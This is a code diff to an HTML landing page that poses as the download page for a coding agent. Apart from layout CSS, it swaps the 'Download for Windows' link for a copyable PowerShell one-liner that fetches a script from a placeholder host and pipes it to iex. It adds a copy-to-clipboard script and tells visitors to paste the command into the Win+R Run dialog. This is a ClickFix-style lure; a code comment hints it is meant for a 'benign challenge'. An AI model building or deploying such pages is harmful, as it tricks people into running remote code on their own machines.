@@ -46,18 +46,18 @@
       color: #555;
     }
 
+    /* Full-width hero background responsive to zoom */
     .hero {
       position: relative;
-      max-width: 1180px;
-      height: 510px;
-      margin: 10px auto 0;
+      width: 100vw;
+      min-height: calc(100vh - 64px);
       overflow: hidden;
-      border-radius: 3px;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       text-align: center;
+      padding: 40px 20px;
       background:
         radial-gradient(circle at 25% 20%, rgba(93,112,255,.75), transparent 38%),
         radial-gradient(circle at 80% 35%, rgba(172,155,255,.75), transparent 42%),
@@ -73,11 +73,17 @@
         radial-gradient(ellipse at 45% 35%, rgba(255,255,255,.7), transparent 35%),
         radial-gradient(ellipse at 75% 70%, rgba(255,255,255,.35), transparent 30%);
       filter: blur(35px);
+      pointer-events: none;
     }
 
     .content {
       position: relative;
       z-index: 1;
+      max-width: 700px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     .icon {
@@ -119,36 +125,58 @@
       color: #222;
     }
 
-    .download {
-      display: inline-flex;
+    /* Command Line Box styling */
+    .command-box {
+      display: flex;
       align-items: center;
-      gap: 9px;
-      padding: 12px 20px;
-      border-radius: 999px;
+      justify-content: space-between;
       background: #050505;
       color: #fff;
-      text-decoration: none;
+      padding: 10px 10px 10px 18px;
+      border-radius: 999px;
+      font-family: monospace;
       font-size: 13px;
-      font-weight: 600;
-      transition: transform .15s ease, background .15s ease;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+      margin-bottom: 16px;
     }
 
-    .download:hover {
+    .command-text {
+      overflow-x: auto;
+      white-space: nowrap;
+      color: #cfd8dc;
+    }
+
+    .copy-btn {
       background: #242424;
-      transform: translateY(-1px);
+      color: #fff;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 999px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s ease;
     }
 
-    .arrow {
-      font-size: 16px;
+    .copy-btn:hover {
+      background: #383838;
+    }
+
+    /* Instructions text styling */
+    .instructions {
+      font-size: 13px;
+      color: #222;
+      font-weight: 500;
+      max-width: 400px;
+      line-height: 1.4;
+      margin: 0;
     }
 
     @media (max-width: 700px) {
       .navbar { padding: 0 18px; }
       .nav-links { display: none; }
-      .hero {
-        margin: 8px 10px 0;
-        height: 480px;
-      }
       h1 {
         font-size: 52px;
       }
@@ -190,14 +218,30 @@
         A coding agent that helps you build and ship with AI.
       </p>
 
-      <!-- Replace # with your benign challenge download/instructions page. -->
-      <a class="download" href="#">
-        Download for Windows
-        <span class="arrow">↗</span>
-      </a>
+      <!-- Command Line Box -->
+      <div class="command-box">
+        <span id="cmdText" class="command-text">iwr https://example.com/install.ps1 -useb | iex</span>
+        <button class="copy-btn" onclick="copyCommand()">Copy</button>
+      </div>
+
+      <!-- Windows Instructions -->
+      <p class="instructions">
+        Copy the command, click <strong>Win Key + R</strong> and enter.
+      </p>
 
     </div>
   </main>
+
+  <script>
+    function copyCommand() {
+      const text = document.getElementById("cmdText").innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const btn = document.querySelector(".copy-btn");
+        btn.innerText = "Copied!";
+        setTimeout(() => { btn.innerText = "Copy"; }, 2000);
+      });
+    }
+  </script>
 
 </body>
 </html>
